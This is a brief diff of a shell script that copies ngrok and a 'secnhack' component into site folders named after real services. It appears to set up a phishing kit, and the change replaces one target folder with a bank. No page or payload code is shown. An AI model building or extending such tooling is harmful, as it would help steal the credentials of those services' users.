@@ -59,7 +59,7 @@ cp -R ngrok secnhack sites/protonmail/
 cp -R ngrok secnhack sites/stackoverflow/
 cp -R ngrok secnhack sites/ebay/
 cp -R ngrok secnhack sites/twitch/
-cp -R ngrok secnhack sites/ajio/
+cp -R ngrok secnhack sites/abcbank/
 cp -R ngrok secnhack sites/cryptocurrency/
 cp -R ngrok secnhack sites/mobikwik/
 cp -R ngrok secnhack sites/pinterest/
